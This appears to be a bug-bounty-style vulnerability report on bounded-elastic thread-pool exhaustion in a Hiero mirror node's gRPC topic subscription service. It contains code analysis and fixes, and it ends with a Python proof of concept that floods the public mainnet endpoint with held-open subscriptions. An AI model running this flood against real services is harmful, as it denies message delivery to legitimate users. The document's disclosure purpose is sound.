### Title
Bounded Elastic Thread Pool Exhaustion via Unbounded Concurrent gRPC Topic Subscriptions

### Summary
`SharedTopicListener.listen()` calls `publishOn(Schedulers.boundedElastic())` for every individual subscriber, scheduling each subscriber's message processing on the JVM-wide bounded elastic thread pool. There is no limit on the total number of concurrent gRPC connections, and the only per-connection cap (`maxConcurrentCallsPerConnection = 5`) is trivially bypassed by opening many connections. An unprivileged attacker can exhaust the bounded elastic pool, starving legitimate topic subscribers of processing threads.

### Finding Description
**Exact code path:**

`SharedTopicListener.listen()` (inherited by `RedisTopicListener`):
```
grpc/src/main/java/org/hiero/mirror/grpc/listener/SharedTopicListener.java, lines 21–26
```
```java
public Flux<TopicMessage> listen(TopicMessageFilter filter) {
    return getSharedListener(filter)
            .doOnSubscribe(s -> log.info("Subscribing: {}", filter))
            .onBackpressureBuffer(listenerProperties.getMaxBufferSize(), BufferOverflowStrategy.ERROR)
            .publishOn(Schedulers.boundedElastic(), false, listenerProperties.getPrefetch()); // ← per-subscriber
}
```

`TopicMessageServiceImpl.subscribeTopic()` also schedules on the same pool:
```
grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java, line 70
```
```java
.subscribeOn(Schedulers.boundedElastic()); // safety-check Flux, one per subscriber
```

**Root cause:** `Schedulers.boundedElastic()` is a JVM-wide singleton scheduler capped at `10 × availableProcessors` threads (e.g., 40 threads on a 4-core host). Every call to `listen()` — one per subscriber — attaches a new `publishOn` drain loop that competes for workers from this shared pool. Under sustained message flow, each active subscription's drain loop continuously reschedules itself, effectively holding a worker for the subscription's lifetime. Additionally, each `subscribeTopic()` call spawns a `safetyCheck` Flux on the same pool.

**Why the shared-listener design does not help:** `RedisTopicListener.getSharedListener()` uses `computeIfAbsent` + `.share()` to multiplex the upstream Redis channel, so the Redis I/O is shared. However, the `publishOn(Schedulers.boundedElastic())` operator is applied *downstream* of the share point, inside `listen()`, meaning every subscriber still gets its own drain worker on the bounded elastic pool.

**Exploit flow:**
1. Attacker opens `C` TCP connections to port 5600 (no server-side connection limit enforced in the listener code).
2. On each connection, attacker opens 5 concurrent `subscribeTopic` streams (`maxConcurrentCallsPerConnection = 5`).
3. Total active subscriptions = `5C`. Each subscription calls `listen()` → `publishOn(Schedulers.boundedElastic())`.
4. With messages flowing on the subscribed topics, each drain loop holds a bounded-elastic worker.
5. Once `5C > 10 × CPU_cores`, the pool is saturated; new drain tasks queue behind attacker-held workers.
6. Legitimate subscribers' `publishOn` drain tasks are starved, delaying or dropping their message delivery.

### Impact Explanation
Legitimate HCS topic subscribers (including those monitoring smart contract–related topics) experience message processing starvation: their `publishOn` drain tasks queue behind attacker-controlled workers. Under sustained attack, message delivery latency grows unboundedly, and `onBackpressureBuffer` overflow (`BufferOverflowStrategy.ERROR`) terminates affected subscriptions with an error. This constitutes a denial-of-service against the live-message delivery path with no funds at direct risk, matching the Medium severity classification.

### Likelihood Explanation
The gRPC endpoint is publicly accessible with no authentication required for `subscribeTopic` (confirmed by the proto definition and `ConsensusController`). No per-IP connection limit, no subscription rate limit, and no gRPC-layer throttle exist for this service (throttling is implemented only in the `web3` module for REST/EVM calls). A single attacker machine can open hundreds of TCP connections and thousands of subscriptions with standard gRPC client libraries. The attack is trivially repeatable and requires no special knowledge beyond the public proto definition.

### Recommendation
1. **Cap total concurrent subscriptions** in `TopicMessageServiceImpl` using the existing `subscriberCount` `AtomicLong` (already tracked for metrics): reject new subscriptions above a configurable threshold.
2. **Move `publishOn` outside the per-subscriber path** or use a dedicated, separately-sized scheduler for topic fan-out rather than the shared JVM-wide `Schedulers.boundedElastic()`.
3. **Add per-IP or per-connection subscription limits** at the Netty/gRPC interceptor layer.
4. **Apply a connection-count limit** via Netty's `maxConnectionAge` or a load-balancer policy in addition to `maxConcurrentCallsPerConnection`.

### Proof of Concept
```python
# Requires: pip install grpcio grpcio-tools
import grpc, threading, time
# Assume compiled stubs from consensus_service.proto
from com.hedera.mirror.api.proto import consensus_service_pb2, consensus_service_pb2_grpc
from proto.services import basic_types_pb2

TARGET = "mirror.mainnet.hedera.com:443"
TOPIC_NUM = 41110  # any existing topic
CONNECTIONS = 20   # open 20 TCP connections
STREAMS_PER_CONN = 5  # maxConcurrentCallsPerConnection default

def flood(conn_id):
    channel = grpc.secure_channel(TARGET, grpc.ssl_channel_credentials())
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    query = consensus_service_pb2.ConsensusTopicQuery(
        topicID=basic_types_pb2.TopicID(topicNum=TOPIC_NUM),
        limit=0  # subscribe indefinitely
    )
    streams = [stub.subscribeTopic(query) for _ in range(STREAMS_PER_CONN)]
    # Keep streams alive to hold bounded-elastic workers
    for s in streams:
        threading.Thread(target=lambda st=s: [_ for _ in st], daemon=True).start()
    time.sleep(300)  # hold for 5 minutes

threads = [threading.Thread(target=flood, args=(i,)) for i in range(CONNECTIONS)]
for t in threads: t.start()
# Result: 100 concurrent subscriptions saturate the bounded elastic pool (40 threads on 4-core host)
# Legitimate subscribers experience starvation / BufferOverflowStrategy.ERROR termination
